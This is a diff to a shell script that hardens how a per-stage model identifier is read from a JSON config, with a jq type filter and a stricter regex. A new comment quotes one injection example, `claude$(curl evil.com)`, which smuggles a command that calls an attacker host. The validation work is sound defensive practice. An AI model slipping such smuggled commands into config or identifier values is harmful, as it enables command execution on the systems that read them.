@@ -155,13 +155,18 @@ _count_loopback_rejections_for_stage() {
 _resolve_dispatch_model() {
   local stage="$1" ident="$2"
 
-  # Layer 1: operator-pinned config.
+  # Layer 1: operator-pinned config. `strings` filter discards non-string
+  # types (jq integer 60 → no output) so type-mismatched config silently
+  # falls through. Regex validator then rejects shell-meta payloads
+  # (`claude$(curl evil.com)` contains `$()` which is NOT in the char class).
+  # The optional `\[...\]` suffix accommodates `claude-opus-4-7[1m]` 1M-context
+  # form without admitting brackets anywhere else in the identifier.
   if [[ -f "$CONFIG" ]]; then
     local _cfg
-    _cfg="$(jq -r --arg s "$stage" '.dispatch.model[$s] // empty' \
+    _cfg="$(jq -r --arg s "$stage" '(.dispatch.model[$s] | strings) // empty' \
       "$CONFIG" 2>/dev/null || true)"
     if [[ -n "$_cfg" ]]; then
-      if [[ "$_cfg" =~ ^[A-Za-z0-9._\[\]:-]+$ ]]; then
+      if [[ "$_cfg" =~ ^[A-Za-z0-9._:-]+(\[[A-Za-z0-9._:-]+\])?$ ]]; then
         printf '%s' "$_cfg"; return 0
       else
         log "_resolve_dispatch_model: rejecting config value for $stage (failed regex); falling through" >&2
